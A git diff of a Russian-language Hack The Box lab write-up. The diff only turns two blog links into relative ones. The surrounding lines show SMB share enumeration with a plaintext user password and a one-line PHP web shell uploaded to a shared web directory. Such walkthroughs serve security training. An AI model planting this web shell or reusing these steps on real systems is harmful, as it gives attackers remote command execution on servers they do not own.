@@ -222,7 +222,7 @@ XSRF в первозданном виде!
 
 Очень похоже на расшаренный SMB-ресурс.
 
-С помощью smbmap (о котором я рассказывал в [райтапе](https://snovvcrash.github.io/2018/12/17/htb-active.html#smbmap) на Active) посмотрим, к чему у нас есть доступ:
+С помощью smbmap (о котором я рассказывал в [райтапе](/2018/12/17/htb-active.html#smbmap) на Active) посмотрим, к чему у нас есть доступ:
 ```text
 root@kali:~# smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
 [+] Finding open SMB ports....
@@ -258,7 +258,7 @@ smb: \> ls
 
 # Шелл от имена Тайлера
 ## Web-Shell
-Так как мы имеем доступ на чтение в директорию `\new-site`, дропнем туда простой веб-шелл на PHP с помощью [smbclient](https://snovvcrash.github.io/2018/12/17/htb-active.html#smbclient):
+Так как мы имеем доступ на чтение в директорию `\new-site`, дропнем туда простой веб-шелл на PHP с помощью [smbclient](/2018/12/17/htb-active.html#smbclient):
 ```text
 root@kali:~# cat webshell.php
 <?php system($_REQUEST['cmd']); ?>
